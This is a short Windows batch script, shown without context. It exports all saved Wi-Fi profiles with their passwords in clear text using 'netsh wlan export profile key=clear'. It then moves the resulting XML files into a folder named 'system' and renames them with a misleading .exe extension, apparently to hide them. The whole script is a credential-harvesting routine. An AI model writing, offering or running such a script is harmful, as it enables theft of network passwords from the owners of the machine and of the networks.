@echo off 
netsh wlan export profile key=clear
md system 
move *.xml system
cd system
rename *.xml *.exe

